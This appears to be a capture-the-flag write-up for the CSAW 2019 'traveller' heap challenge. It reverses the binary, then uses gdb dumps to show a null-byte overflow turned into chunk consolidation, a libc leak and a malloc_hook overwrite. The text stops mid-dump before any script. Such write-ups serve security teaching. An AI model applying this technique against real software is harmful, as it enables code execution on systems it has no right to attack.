@@ -1,0 +1,1350 @@
+# Csaw 2019 traveller
+
+Let's take a look at the binary and libc:
+
+```
+$    file traveller
+traveller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b551cbb805a21e18393c3816ffd28dfb11b1ff1e, with debug_info, not stripped
+$    pwn checksec traveller
+[*] '/Hackery/pod/modules/33-custom_misc_heap/csaw19_traveller/traveller'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+$    ./libc-2.23.so
+GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
+Copyright (C) 2016 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 5.4.0 20160609.
+Available extensions:
+    crypt add-on version 2.1 by Michael Glad and others
+    GNU Libidn by Simon Josefsson
+    Native POSIX Threads Library by Ulrich Drepper et al
+    BIND-8.2.3-T5B
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
+$    ./traveller
+
+Hello! Welcome to trip management system.
+0x7fffcb8d8a0c
+
+Choose an option:
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+```
+
+So looking at this, we are dealing with a `64` bit binary with `NX`. We can see that we are dealing with `libc-2.23.so`. When we run the binary we get what looks like a stack infoleak, and we see a menu.
+
+## Reversing
+
+When we take a look at the `main` function in Ghidra, we see this:
+
+```
+int main(int argc)
+
+{
+  uint input;
+  int argcCpy;
+  char choiceInput [4];
+  uint choice_num;
+ 
+  argcCpy = argc;
+  puts("\nHello! Welcome to trip management system. ");
+  printf("%p \n",&argcCpy);
+  puts("\nChoose an option: ");
+  do {
+    while( true ) {
+      while( true ) {
+        puts("\n1. Add a trip ");
+        puts("2. Change a trip ");
+        puts("3. Delete a trip ");
+        puts("4. Check a trip ");
+        printf("> ");
+        fflush(stdout);
+        fgets(choiceInput,4,stdin);
+        input = atoi(choiceInput);
+        if (input != 2) break;
+        change();
+      }
+      if (input < 3) break;
+      if (input == 3) {
+        delete();
+      }
+      else {
+        if (input == 4) {
+          check();
+        }
+      }
+    }
+    if (input == 1) {
+      add();
+    }
+  } while( true );
+}
+```
+
+So it is essentially just a menu, allowing us to `add`, `change`, `delete`, and `check` (also we get a stack infoleak):
+
+```
+void add(void)
+
+{
+  int iVar1;
+  trip *ptr;
+  ulong size;
+  ulong uVar2;
+  char *pcVar3;
+  long lVar4;
+  char choice [4];
+  int choice_num;
+  trip *newTrip;
+ 
+  if (tIndex != 7) {
+    puts("Adding new trips...");
+    ptr = (trip *)malloc(0x10);
+    puts("Choose a Distance: ");
+    puts("1. 0x80 ");
+    puts("2. 0x110 ");
+    puts("3. 0x128 ");
+    puts("4. 0x150 ");
+    puts("5. 0x200 ");
+    printf("> ");
+    fgets(choice,4,stdin);
+    iVar1 = atoi(choice);
+    switch(iVar1) {
+    default:
+      puts("Can\'t you count?");
+      return;
+    case 1:
+      size = strtoul("0x80",(char **)0x0,0);
+      ptr->distance = size;
+      pcVar3 = (char *)malloc(ptr->distance);
+      ptr->destination = pcVar3;
+      printf("Destination: ");
+      fgets(ptr->destination,(int)ptr->distance,stdin);
+      break;
+    case 2:
+      uVar2 = strtoul("0x110",(char **)0x0,0);
+      ptr->distance = uVar2;
+      pcVar3 = (char *)malloc(ptr->distance);
+      ptr->destination = pcVar3;
+      printf("Destination: ");
+      fgets(ptr->destination,(int)ptr->distance,stdin);
+      break;
+    case 3:
+      uVar2 = strtoul("0x128",(char **)0x0,0);
+      ptr->distance = uVar2;
+      pcVar3 = (char *)malloc(ptr->distance);
+      ptr->destination = pcVar3;
+      printf("Destination: ");
+      fgets(ptr->destination,(int)ptr->distance,stdin);
+      break;
+    case 4:
+      uVar2 = strtoul("0x150",(char **)0x0,0);
+      ptr->distance = uVar2;
+      pcVar3 = (char *)malloc(ptr->distance);
+      ptr->destination = pcVar3;
+      printf("Destination: ");
+      fgets(ptr->destination,(int)ptr->distance,stdin);
+      break;
+    case 5:
+      uVar2 = strtoul("0x200",(char **)0x0,0);
+      ptr->distance = uVar2;
+      pcVar3 = (char *)malloc(ptr->distance);
+      ptr->destination = pcVar3;
+      printf("Destination: ");
+      fgets(ptr->destination,(int)ptr->distance,stdin);
+    }
+    printf("Trip %lu added.\n",(ulong)(uint)tIndex);
+    lVar4 = (long)tIndex;
+    tIndex = tIndex + 1;
+    trips[lVar4] = ptr;
+    return;
+  }
+  puts("Cannot add more trips.");
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+```
+
+So for the `add` function, it prompts us for a chunk size of either `0x80/0x110/0x128/0x150/0x200`. However this isn't the only chunk that is malloced. There is a `0x10` chunk, which contains a ptr to the new chunk, and the size. This ptr is stored in the bss variable `trips`, with the count for the number of chunks being stored in `tIndex`. In addition to that, it allows us to scan in data into the chunk whose size we have some control over. We can see that the heap structure looks like this:
+
+```
+0x0:    ptr to trip chunk
+0x8:    size of trip chunk
+
+trip chunk
+```
+
+Next up we have `change`:
+
+```
+void change(void)
+
+{
+  ulong index;
+  ssize_t bytesRead;
+  char buf [20];
+  ssize_t bytes_read;
+  trip *oldTrip;
+  ssize_t choice;
+  trip *ptr;
+ 
+  printf("Update trip: ");
+  fgets(buf,0x14,stdin);
+  index = strtoul(buf,(char **)0x0,0);
+  if ((long)index < (long)tIndex) {
+    ptr = trips[index];
+    bytesRead = read(0,ptr->destination,ptr->distance);
+    ptr->destination[bytesRead] = '\0';
+  }
+  else {
+    puts("No upcoming trip to update.");
+  }
+  return;
+}
+```
+
+So we can see that it allows us to specify an index to `trips`, and scan in data into the trip chunk for that index. We can see that there are two bugs here. It checks to make sure that the index we provide is not larger than `tIndex` (the count of the number of trip chunks), however there is nothing stopping us from picking an index like `-5` and referencing something before the start of the ptr array. This index check bug we see in a few different places throughout this binary, however I didn't really use it. The second bug we can see is a null byte overflow:
+
+```
+    bytesRead = read(0,ptr->destination,ptr->distance);
+    ptr->destination[bytesRead] = '\0';
+```
+
+Next up we have the `delte` function:
+
+```
+void delete(void)
+
+{
+  trip *__ptr;
+  ulong index;
+  char buf [20];
+  trip *tp;
+  ssize_t i;
+ 
+  printf("Which trip you want to delete: ");
+  fgets(buf,0x14,stdin);
+  index = strtoul(buf,(char **)0x0,0);
+  if ((long)index < (long)tIndex) {
+    __ptr = trips[index];
+    if (0 < tIndex) {
+      trips[index] = trips[(long)(tIndex + -1)];
+      tIndex = tIndex + -1;
+    }
+    free(__ptr->destination);
+    free(__ptr);
+  }
+  else {
+    puts("That trip is not there already.");
+  }
+  return;
+}
+```
+
+So we can see that it frees both of the chunks. It also does the same index check, so it is also vulnerable to the same index check bug.
+
+```
+void check(void)
+
+{
+  ulong index;
+  char choice [4];
+  trip *aTrip;
+  ssize_t i;
+ 
+  puts("Which trip you want to view? ");
+  putchar(0x3e);
+  fgets(choice,4,stdin);
+  index = strtoul(choice,(char **)0x0,0);
+  if ((long)index < (long)tIndex) {
+    printf("%s \n",trips[index]->destination);
+  }
+  else {
+    puts("No trip in here. ");
+  }
+  return;
+}
+```
+
+So here we see it prompts us for an index, and prints the data we specified for that chunk.
+
+## Exploitation
+
+So we have a null byte overflow bug. We will leverage this to cause heap consolidation to the start of one of our trip chunks (the ones we can write to). We will leverage this first for a libc infoleak, then a write. Then we will use that space to allocate one of those `0x10` chunks with a ptr that get's written to. We will then overwrite that ptr to malloc hook, and overwrite it with a oneshot gadget. Then we will just call.
+
+The first problem we have to deal with is that by the `0x10` chunks are allocated right next to our trip chunks:
+
+```
+gef➤  x/50g  0x603820
+0x603820:    0x0    0x21
+0x603830:    0x603850    0x80
+0x603840:    0x0    0x91
+0x603850:    0x3832373533393531    0xa
+0x603860:    0x0    0x0
+0x603870:    0x0    0x0
+0x603880:    0x0    0x0
+0x603890:    0x0    0x0
+0x6038a0:    0x0    0x0
+0x6038b0:    0x0    0x0
+0x6038c0:    0x0    0x0
+0x6038d0:    0x0    0x21
+0x6038e0:    0x603900    0x80
+0x6038f0:    0x0    0x91
+0x603900:    0x3832313539333537    0xa
+0x603910:    0x0    0x0
+0x603920:    0x0    0x0
+0x603930:    0x0    0x0
+0x603940:    0x0    0x0
+0x603950:    0x0    0x0
+0x603960:    0x0    0x0
+0x603970:    0x0    0x0
+0x603980:    0x0    0x20681
+0x603990:    0x0    0x0
+0x6039a0:    0x0    0x0
+```
+
+We can get around this by allocating like `4` chunks, then freeing them. That way the `0x10` size chunks will get inserted into the fastbin and reused, so we will be able to get our trip chunks to align right next to each other. Now let's walk through and see how the memory is corrupted to give us a shell. Next we allocate four chunks that are right next to each other:
+
+```
+gef➤  x/150g 0x235b650
+0x235b650:    0x0    0x121
+0x235b660:    0x3030303030303030    0xa
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x0    0x131
+0x235b780:    0x3131313131313131    0xa
+0x235b790:    0x0    0x0
+0x235b7a0:    0x0    0x0
+0x235b7b0:    0x0    0x0
+0x235b7c0:    0x0    0x0
+0x235b7d0:    0x0    0x0
+0x235b7e0:    0x0    0x0
+0x235b7f0:    0x0    0x0
+0x235b800:    0x0    0x0
+0x235b810:    0x0    0x0
+0x235b820:    0x0    0x0
+0x235b830:    0x0    0x0
+0x235b840:    0x0    0x0
+0x235b850:    0x0    0x0
+0x235b860:    0x0    0x0
+0x235b870:    0x0    0x0
+0x235b880:    0x0    0x0
+0x235b890:    0x0    0x0
+0x235b8a0:    0x0    0x121
+0x235b8b0:    0x3232323232323232    0xa
+0x235b8c0:    0x0    0x0
+0x235b8d0:    0x0    0x0
+0x235b8e0:    0x0    0x0
+0x235b8f0:    0x0    0x0
+0x235b900:    0x0    0x0
+0x235b910:    0x0    0x0
+0x235b920:    0x0    0x0
+0x235b930:    0x0    0x0
+0x235b940:    0x0    0x0
+0x235b950:    0x0    0x0
+0x235b960:    0x0    0x0
+0x235b970:    0x0    0x0
+0x235b980:    0x0    0x0
+0x235b990:    0x0    0x0
+0x235b9a0:    0x0    0x0
+0x235b9b0:    0x0    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+```
+
+So we can see our four chunks. We will start off by freeing the first one:
+
+```
+0x235b650:    0x0    0x121
+0x235b660:    0x7fbb12b01b78    0x7fbb12b01b78
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x120    0x130
+0x235b780:    0x3131313131313131    0xa
+0x235b790:    0x0    0x0
+0x235b7a0:    0x0    0x0
+0x235b7b0:    0x0    0x0
+0x235b7c0:    0x0    0x0
+0x235b7d0:    0x0    0x0
+0x235b7e0:    0x0    0x0
+0x235b7f0:    0x0    0x0
+0x235b800:    0x0    0x0
+0x235b810:    0x0    0x0
+0x235b820:    0x0    0x0
+0x235b830:    0x0    0x0
+0x235b840:    0x0    0x0
+0x235b850:    0x0    0x0
+0x235b860:    0x0    0x0
+0x235b870:    0x0    0x0
+0x235b880:    0x0    0x0
+0x235b890:    0x0    0x0
+0x235b8a0:    0x0    0x121
+0x235b8b0:    0x3232323232323232    0xa
+0x235b8c0:    0x0    0x0
+0x235b8d0:    0x0    0x0
+0x235b8e0:    0x0    0x0
+0x235b8f0:    0x0    0x0
+0x235b900:    0x0    0x0
+0x235b910:    0x0    0x0
+0x235b920:    0x0    0x0
+0x235b930:    0x0    0x0
+0x235b940:    0x0    0x0
+0x235b950:    0x0    0x0
+0x235b960:    0x0    0x0
+0x235b970:    0x0    0x0
+0x235b980:    0x0    0x0
+0x235b990:    0x0    0x0
+0x235b9a0:    0x0    0x0
+0x235b9b0:    0x0    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+0x235b9e0:    0x0    0x0
+0x235b9f0:    0x0    0x0
+0x235ba00:    0x0    0x0
+0x235ba10:    0x0    0x0
+0x235ba20:    0x0    0x0
+0x235ba30:    0x0    0x0
+0x235ba40:    0x0    0x0
+0x235ba50:    0x0    0x0
+0x235ba60:    0x0    0x0
+0x235ba70:    0x0    0x0
+0x235ba80:    0x0    0x0
+0x235ba90:    0x0    0x0
+0x235baa0:    0x0    0x0
+0x235bab0:    0x0    0x0
+0x235bac0:    0x0    0x0
+0x235bad0:    0x0    0x0
+0x235bae0:    0x0    0x0
+0x235baf0:    0x0    0x0
+```
+
+Now that the first one has been freed, we will edit the second chunk to overflow the least significant byte of the third chunk with a null byte. This will change it's size from `0x121` to `0x100`. We will also set the previous size to `0x250`, so it thinks that the previous chunk started where our first chunk is:
+
+```
+gef➤  x/150g 0x235b650
+0x235b650:    0x0    0x121
+0x235b660:    0x7fbb12b01b78    0x7fbb12b01b78
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x120    0x130
+0x235b780:    0x3838383838383838    0x3838383838383838
+0x235b790:    0x3838383838383838    0x3838383838383838
+0x235b7a0:    0x3838383838383838    0x3838383838383838
+0x235b7b0:    0x3838383838383838    0x3838383838383838
+0x235b7c0:    0x3838383838383838    0x3838383838383838
+0x235b7d0:    0x3838383838383838    0x3838383838383838
+0x235b7e0:    0x3838383838383838    0x3838383838383838
+0x235b7f0:    0x3838383838383838    0x3838383838383838
+0x235b800:    0x3838383838383838    0x3838383838383838
+0x235b810:    0x3838383838383838    0x3838383838383838
+0x235b820:    0x3838383838383838    0x3838383838383838
+0x235b830:    0x3838383838383838    0x3838383838383838
+0x235b840:    0x3838383838383838    0x3838383838383838
+0x235b850:    0x3838383838383838    0x3838383838383838
+0x235b860:    0x3838383838383838    0x3838383838383838
+0x235b870:    0x3838383838383838    0x3838383838383838
+0x235b880:    0x3838383838383838    0x3838383838383838
+0x235b890:    0x3838383838383838    0x3838383838383838
+0x235b8a0:    0x250    0x100
+0x235b8b0:    0x3232323232323232    0xa
+0x235b8c0:    0x0    0x0
+0x235b8d0:    0x0    0x0
+0x235b8e0:    0x0    0x0
+0x235b8f0:    0x0    0x0
+0x235b900:    0x0    0x0
+0x235b910:    0x0    0x0
+0x235b920:    0x0    0x0
+0x235b930:    0x0    0x0
+0x235b940:    0x0    0x0
+0x235b950:    0x0    0x0
+0x235b960:    0x0    0x0
+0x235b970:    0x0    0x0
+0x235b980:    0x0    0x0
+0x235b990:    0x0    0x0
+0x235b9a0:    0x0    0x0
+0x235b9b0:    0x0    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+0x235b9e0:    0x0    0x0
+0x235b9f0:    0x0    0x0
+0x235ba00:    0x0    0x0
+0x235ba10:    0x0    0x0
+0x235ba20:    0x0    0x0
+0x235ba30:    0x0    0x0
+0x235ba40:    0x0    0x0
+0x235ba50:    0x0    0x0
+0x235ba60:    0x0    0x0
+0x235ba70:    0x0    0x0
+0x235ba80:    0x0    0x0
+0x235ba90:    0x0    0x0
+0x235baa0:    0x0    0x0
+0x235bab0:    0x0    0x0
+0x235bac0:    0x0    0x0
+0x235bad0:    0x0    0x0
+0x235bae0:    0x0    0x0
+0x235baf0:    0x0    0x0
+```
+
+Now there is a slight problem with what we have done. The size of the third chunk is now `0x100`. It will expect a new chunk at `0x235b8a0 + 0x100 = 0x235b9a0` (since we have allocated another chunk after this). So it will expect another chunk at `0x235b9a0`, that fills up the rest of the space to the top chunk. We can satisfy this by making a fake chunk there with a size of `0x231` since `0x235b9a0 + 0x230 = 0x235bbd0`, which we can see is where the top chunk is:
+
+```
+gef➤  x/200g 0x235b650
+0x235b650:    0x0    0x121
+0x235b660:    0x7fbb12b01b78    0x7fbb12b01b78
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x120    0x130
+0x235b780:    0x3838383838383838    0x3838383838383838
+0x235b790:    0x3838383838383838    0x3838383838383838
+0x235b7a0:    0x3838383838383838    0x3838383838383838
+0x235b7b0:    0x3838383838383838    0x3838383838383838
+0x235b7c0:    0x3838383838383838    0x3838383838383838
+0x235b7d0:    0x3838383838383838    0x3838383838383838
+0x235b7e0:    0x3838383838383838    0x3838383838383838
+0x235b7f0:    0x3838383838383838    0x3838383838383838
+0x235b800:    0x3838383838383838    0x3838383838383838
+0x235b810:    0x3838383838383838    0x3838383838383838
+0x235b820:    0x3838383838383838    0x3838383838383838
+0x235b830:    0x3838383838383838    0x3838383838383838
+0x235b840:    0x3838383838383838    0x3838383838383838
+0x235b850:    0x3838383838383838    0x3838383838383838
+0x235b860:    0x3838383838383838    0x3838383838383838
+0x235b870:    0x3838383838383838    0x3838383838383838
+0x235b880:    0x3838383838383838    0x3838383838383838
+0x235b890:    0x3838383838383838    0x3838383838383838
+0x235b8a0:    0x250    0x100
+0x235b8b0:    0x3030303030303030    0x3030303030303030
+0x235b8c0:    0x3030303030303030    0x3030303030303030
+0x235b8d0:    0x3030303030303030    0x3030303030303030
+0x235b8e0:    0x3030303030303030    0x3030303030303030
+0x235b8f0:    0x3030303030303030    0x3030303030303030
+0x235b900:    0x3030303030303030    0x3030303030303030
+0x235b910:    0x3030303030303030    0x3030303030303030
+0x235b920:    0x3030303030303030    0x3030303030303030
+0x235b930:    0x3030303030303030    0x3030303030303030
+0x235b940:    0x3030303030303030    0x3030303030303030
+0x235b950:    0x3030303030303030    0x3030303030303030
+0x235b960:    0x3030303030303030    0x3030303030303030
+0x235b970:    0x3030303030303030    0x3030303030303030
+0x235b980:    0x3030303030303030    0x3030303030303030
+0x235b990:    0x3030303030303030    0x3030303030303030
+0x235b9a0:    0x0    0x231
+0x235b9b0:    0xa    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+0x235b9e0:    0x0    0x0
+0x235b9f0:    0x0    0x0
+0x235ba00:    0x0    0x0
+0x235ba10:    0x0    0x0
+0x235ba20:    0x0    0x0
+0x235ba30:    0x0    0x0
+0x235ba40:    0x0    0x0
+0x235ba50:    0x0    0x0
+0x235ba60:    0x0    0x0
+0x235ba70:    0x0    0x0
+0x235ba80:    0x0    0x0
+0x235ba90:    0x0    0x0
+0x235baa0:    0x0    0x0
+0x235bab0:    0x0    0x0
+0x235bac0:    0x0    0x0
+0x235bad0:    0x0    0x0
+0x235bae0:    0x0    0x0
+0x235baf0:    0x0    0x0
+0x235bb00:    0x0    0x0
+0x235bb10:    0x0    0x0
+0x235bb20:    0x0    0x0
+0x235bb30:    0x0    0x0
+0x235bb40:    0x0    0x0
+0x235bb50:    0x0    0x0
+0x235bb60:    0x0    0x0
+0x235bb70:    0x0    0x0
+0x235bb80:    0x0    0x0
+0x235bb90:    0x0    0x0
+0x235bba0:    0x0    0x0
+0x235bbb0:    0x0    0x0
+0x235bbc0:    0x0    0x0
+0x235bbd0:    0x0    0x1f431
+0x235bbe0:    0x0    0x0
+0x235bbf0:    0x0    0x0
+0x235bc00:    0x0    0x0
+0x235bc10:    0x0    0x0
+0x235bc20:    0x0    0x0
+0x235bc30:    0x0    0x0
+0x235bc40:    0x0    0x0
+0x235bc50:    0x0    0x0
+0x235bc60:    0x0    0x0
+0x235bc70:    0x0    0x0
+0x235bc80:    0x0    0x0
+```
+
+Now for the next step, we will cause the consolidation by freeing the third chunk here. After that we can just allocate a `0x110` byte chunk, which will bring the start of the unsorted bin up to our second chunk which we scan still write to (and we can print the data from it, and get a libc infoleak):
+
+```
+gef➤  x/200g 0x235b650
+0x235b650:    0x0    0x121
+0x235b660:    0x3434343434343434    0x7fbb12b0000a
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x120    0x231
+0x235b780:    0x7fbb12b01b78    0x7fbb12b01b78
+0x235b790:    0x3838383838383838    0x3838383838383838
+0x235b7a0:    0x3838383838383838    0x3838383838383838
+0x235b7b0:    0x3838383838383838    0x3838383838383838
+0x235b7c0:    0x3838383838383838    0x3838383838383838
+0x235b7d0:    0x3838383838383838    0x3838383838383838
+0x235b7e0:    0x3838383838383838    0x3838383838383838
+0x235b7f0:    0x3838383838383838    0x3838383838383838
+0x235b800:    0x3838383838383838    0x3838383838383838
+0x235b810:    0x3838383838383838    0x3838383838383838
+0x235b820:    0x3838383838383838    0x3838383838383838
+0x235b830:    0x3838383838383838    0x3838383838383838
+0x235b840:    0x3838383838383838    0x3838383838383838
+0x235b850:    0x3838383838383838    0x3838383838383838
+0x235b860:    0x3838383838383838    0x3838383838383838
+0x235b870:    0x3838383838383838    0x3838383838383838
+0x235b880:    0x3838383838383838    0x3838383838383838
+0x235b890:    0x3838383838383838    0x3838383838383838
+0x235b8a0:    0x250    0x100
+0x235b8b0:    0x3030303030303030    0x3030303030303030
+0x235b8c0:    0x3030303030303030    0x3030303030303030
+0x235b8d0:    0x3030303030303030    0x3030303030303030
+0x235b8e0:    0x3030303030303030    0x3030303030303030
+0x235b8f0:    0x3030303030303030    0x3030303030303030
+0x235b900:    0x3030303030303030    0x3030303030303030
+0x235b910:    0x3030303030303030    0x3030303030303030
+0x235b920:    0x3030303030303030    0x3030303030303030
+0x235b930:    0x3030303030303030    0x3030303030303030
+0x235b940:    0x3030303030303030    0x3030303030303030
+0x235b950:    0x3030303030303030    0x3030303030303030
+0x235b960:    0x3030303030303030    0x3030303030303030
+0x235b970:    0x3030303030303030    0x3030303030303030
+0x235b980:    0x3030303030303030    0x3030303030303030
+0x235b990:    0x3030303030303030    0x3030303030303030
+0x235b9a0:    0x230    0x230
+0x235b9b0:    0xa    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+0x235b9e0:    0x0    0x0
+0x235b9f0:    0x0    0x0
+0x235ba00:    0x0    0x0
+0x235ba10:    0x0    0x0
+0x235ba20:    0x0    0x0
+0x235ba30:    0x0    0x0
+0x235ba40:    0x0    0x0
+0x235ba50:    0x0    0x0
+0x235ba60:    0x0    0x0
+0x235ba70:    0x0    0x0
+0x235ba80:    0x0    0x0
+0x235ba90:    0x0    0x0
+0x235baa0:    0x0    0x0
+0x235bab0:    0x0    0x0
+0x235bac0:    0x0    0x0
+0x235bad0:    0x0    0x0
+0x235bae0:    0x0    0x0
+0x235baf0:    0x0    0x0
+0x235bb00:    0x0    0x0
+0x235bb10:    0x0    0x0
+0x235bb20:    0x0    0x0
+0x235bb30:    0x0    0x0
+0x235bb40:    0x0    0x0
+0x235bb50:    0x0    0x0
+0x235bb60:    0x0    0x0
+0x235bb70:    0x0    0x0
+0x235bb80:    0x0    0x0
+0x235bb90:    0x0    0x0
+0x235bba0:    0x0    0x0
+0x235bbb0:    0x0    0x0
+0x235bbc0:    0x0    0x0
+0x235bbd0:    0x0    0x1f431
+0x235bbe0:    0x0    0x0
+0x235bbf0:    0x0    0x0
+0x235bc00:    0x0    0x0
+0x235bc10:    0x0    0x0
+0x235bc20:    0x0    0x0
+0x235bc30:    0x0    0x0
+0x235bc40:    0x0    0x0
+0x235bc50:    0x0    0x0
+0x235bc60:    0x0    0x0
+0x235bc70:    0x0    0x0
+0x235bc80:    0x0    0x0
+```
+
+Next we will allocate chunks, untill we have one of those `0x10` chunks overlapping with our second chunk:
+
+```
+gef➤  x/150g 0x235b650
+0x235b650:    0x0    0x121
+0x235b660:    0x3434343434343434    0x7fbb12b0000a
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x120    0x21
+0x235b780:    0x235b7a0    0x80
+0x235b790:    0x3838383838383838    0x91
+0x235b7a0:    0x3636363636363636    0x7fbb12b0000a
+0x235b7b0:    0x3838383838383838    0x3838383838383838
+0x235b7c0:    0x3838383838383838    0x3838383838383838
+0x235b7d0:    0x3838383838383838    0x3838383838383838
+0x235b7e0:    0x3838383838383838    0x3838383838383838
+0x235b7f0:    0x3838383838383838    0x3838383838383838
+0x235b800:    0x3838383838383838    0x3838383838383838
+0x235b810:    0x3838383838383838    0x3838383838383838
+0x235b820:    0x3838383838383838    0x181
+0x235b830:    0x7fbb12b01b78    0x7fbb12b01b78
+0x235b840:    0x3838383838383838    0x3838383838383838
+0x235b850:    0x3838383838383838    0x3838383838383838
+0x235b860:    0x3838383838383838    0x3838383838383838
+0x235b870:    0x3838383838383838    0x3838383838383838
+0x235b880:    0x3838383838383838    0x3838383838383838
+0x235b890:    0x3838383838383838    0x3838383838383838
+0x235b8a0:    0x250    0x100
+0x235b8b0:    0x3030303030303030    0x3030303030303030
+0x235b8c0:    0x3030303030303030    0x3030303030303030
+0x235b8d0:    0x3030303030303030    0x3030303030303030
+0x235b8e0:    0x3030303030303030    0x3030303030303030
+0x235b8f0:    0x3030303030303030    0x3030303030303030
+0x235b900:    0x3030303030303030    0x3030303030303030
+0x235b910:    0x3030303030303030    0x3030303030303030
+0x235b920:    0x3030303030303030    0x3030303030303030
+0x235b930:    0x3030303030303030    0x3030303030303030
+0x235b940:    0x3030303030303030    0x3030303030303030
+0x235b950:    0x3030303030303030    0x3030303030303030
+0x235b960:    0x3030303030303030    0x3030303030303030
+0x235b970:    0x3030303030303030    0x3030303030303030
+0x235b980:    0x3030303030303030    0x3030303030303030
+0x235b990:    0x3030303030303030    0x3030303030303030
+0x235b9a0:    0x180    0x230
+0x235b9b0:    0xa    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+0x235b9e0:    0x0    0x0
+0x235b9f0:    0x0    0x0
+0x235ba00:    0x0    0x0
+0x235ba10:    0x0    0x0
+0x235ba20:    0x0    0x0
+0x235ba30:    0x0    0x0
+0x235ba40:    0x0    0x0
+0x235ba50:    0x0    0x0
+0x235ba60:    0x0    0x0
+0x235ba70:    0x0    0x0
+0x235ba80:    0x0    0x0
+0x235ba90:    0x0    0x0
+0x235baa0:    0x0    0x0
+0x235bab0:    0x0    0x0
+0x235bac0:    0x0    0x0
+0x235bad0:    0x0    0x0
+0x235bae0:    0x0    0x0
+0x235baf0:    0x0    0x0
+```
+
+Now that we have an `0x10` byte chunk overlapping with the second chunk, we will overwrite the ptr in it to point to the malloc hook:
+
+```
+gef➤  x/150g 0x235b650
+0x235b650:    0x0    0x121
+0x235b660:    0x3434343434343434    0x7fbb12b0000a
+0x235b670:    0x0    0x0
+0x235b680:    0x0    0x0
+0x235b690:    0x0    0x0
+0x235b6a0:    0x0    0x0
+0x235b6b0:    0x0    0x0
+0x235b6c0:    0x0    0x0
+0x235b6d0:    0x0    0x0
+0x235b6e0:    0x0    0x1f921
+0x235b6f0:    0x0    0x0
+0x235b700:    0x0    0x0
+0x235b710:    0x0    0x0
+0x235b720:    0x0    0x0
+0x235b730:    0x0    0x0
+0x235b740:    0x0    0x0
+0x235b750:    0x0    0x0
+0x235b760:    0x0    0x0
+0x235b770:    0x120    0x21
+0x235b780:    0x7fbb12b01b10    0xa
+0x235b790:    0x3838383838383838    0x91
